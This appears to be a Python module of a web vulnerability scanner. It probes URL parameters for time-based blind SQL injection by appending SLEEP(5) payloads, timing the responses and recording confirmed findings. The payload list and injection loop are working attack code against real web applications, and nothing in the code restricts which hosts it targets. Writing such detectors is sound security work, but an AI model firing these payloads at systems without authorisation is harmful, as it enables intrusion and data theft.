import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


BLIND_SQLI_PAYLOADS = [
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
    "1\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
    "' AND SLEEP(5) AND 'abc'='abc",
    "1 AND SLEEP(5)" 
]

DELAY_THRESHOLD = 4.5  

def measure_response_time(url):
    # Using a session can be faster and more consistent
    try:
        start = time.time()
        requests.get(url, timeout=15) # Increased timeout
        return time.time() - start
    except requests.RequestException:
        return None

def test_url_for_blind_sqli(url):
    findings = {}
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return []

    for param in params:
        for payload in BLIND_SQLI_PAYLOADS:
            test_params = params.copy()
            # Most SQLi in Blind requires a valid ID first, then the AND SLEEP
            # We try appending the payload to the original value
            original_val = params[param][0]
            test_params[param] = [f"{original_val}{payload}"]

            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=test_query))

            # Test the injected URL
            injected_time = measure_response_time(test_url)
            
            if injected_time and injected_time >= DELAY_THRESHOLD:
                # RE-TEST to confirm (Prevents false positives from lag)
                reconfirm_time = measure_response_time(test_url)
                if reconfirm_time and reconfirm_time >= DELAY_THRESHOLD:
                    key = f"blind_sqli::{parsed.path}::{param}"

                    if key not in findings:
                        findings[key] = {
                            "type": "Blind SQL Injection (Time-Based)",
                            "location": "URL Parameter",
                            "parameter": param,
                            "page": parsed.path,
                            "risk": "Critical",
                            "evidence": f"Confirmed: Response delayed by {round(reconfirm_time, 2)}s",
                            "payloads": []
                        }
                    findings[key]["payloads"].append(payload)
                    break # Move to next parameter once found
                    
    return list(findings.values())